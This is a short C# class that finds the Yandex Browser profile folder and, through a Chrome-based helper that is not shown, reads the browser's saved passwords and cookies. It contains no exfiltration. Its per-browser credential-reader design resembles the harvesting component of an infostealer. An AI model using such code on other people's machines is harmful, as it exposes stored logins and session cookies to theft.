using System;
using System.Collections.Generic;
using System.IO;

namespace dao
{
    class Yandex : IReader
    {
        public string BrowserName { get { return "Yandex"; } }

        private readonly BaseChrome Model;

        public Yandex()
        {
            string LOCAL_PATH = BaseChrome.GetAppDataLocalPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"Yandex\YandexBrowser\User Data");
            Model = new BaseChrome(userDataPath);
        }

        public IEnumerable<PassModel> Passwords(string host = null)
        {
            return Model.ReadPassword(host);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host);
        }

    }
}
